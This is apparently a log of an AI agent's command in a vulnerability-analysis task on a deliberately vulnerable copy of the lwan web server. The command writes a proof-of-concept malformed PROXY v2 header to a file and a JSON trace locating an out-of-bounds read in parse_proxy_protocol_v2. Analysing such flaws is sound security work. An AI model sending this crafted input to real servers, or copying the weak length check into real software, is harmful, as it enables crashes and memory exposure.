message:
Command `cd /workspace/repo-vul/src-vul/lwan && python3 - <<'PY'
from pathlib import Path
p=Path('/workspace/poc.bin')
# malformed PROXY v2 header with claimed len bigger than actual buffer
p.write_bytes(b'\r\n\r\n\x00\r\nQUIT\n'+bytes([0x21,0x11])+ (64).to_bytes(2,'big') + b'A'*8)
print(p, p.stat().st_size)
PY
cat > /workspace/candidate_trace.json <<'JSON'
[
  {"step":1,"file":"repo-vul/src-vul/lwan/src/lib/lwan-request.c","function":"parse_http_request","line":1169,"var":"buffer","code":"buffer = parse_proxy_protocol(request, buffer);","note":"The request parser forwards attacker-controlled bytes to the proxy-protocol parser when proxy support is enabled."},
  {"step":2,"file":"repo-vul/src-vul/lwan/src/lib/lwan-request.c","function":"parse_proxy_protocol","line":1153,"var":"buffer","code":"switches on the leading signature and dispatches to parse_proxy_protocol_v2 for a PROXY v2 header","note":"A crafted connection prefix selects the v2 parsing path while keeping the remainder of the input attacker-controlled."},
  {"step":3,"file":"repo-vul/src-vul/lwan/src/lib/lwan-request.c","function":"parse_proxy_protocol_v2","line":225,"var":"hdr","code":"struct proxy_header_v2 *hdr = (struct proxy_header_v2 *)buffer;","note":"The parser reinterprets the request buffer as a fixed-size proxy header structure."},
  {"step":4,"file":"repo-vul/src-vul/lwan/src/lib/lwan-request.c","function":"parse_proxy_protocol_v2","line":233,"var":"size","code":"size = proto_signature_length + (unsigned int)ntohs(hdr->len);","note":"The record length comes from attacker-controlled header bytes, so the parser trusts a length chosen by the input."},
  {"step":5,"file":"repo-vul/src-vul/lwan/src/lib/lwan-request.c","function":"parse_proxy_protocol_v2","line":234,"var":"size check","code":"if (UNLIKELY(size > (unsigned int)sizeof(*hdr))) return NULL;","note":"This check incorrectly compares the claimed payload length against the size of the in-memory struct, not against the bytes actually buffered, so a too-short packet can still pass when the length is <= sizeof(*hdr)."},
  {"step":6,"file":"repo-vul/src-vul/lwan/src/lib/lwan-request.c","function":"parse_proxy_protocol_v2","line":236,"var":"hdr->addr.ip4","code":"if (LIKELY(hdr->cmd_ver == PROXY)) { ... from->sin_addr.s_addr = hdr->addr.ip4.src_addr; ... }","note":"After the weak check, the parser reads address and port fields from beyond the available input region, which is the memory-safety sink that can lead to an out-of-bounds access/crash."}
]
JSON` executed with exit code 0.
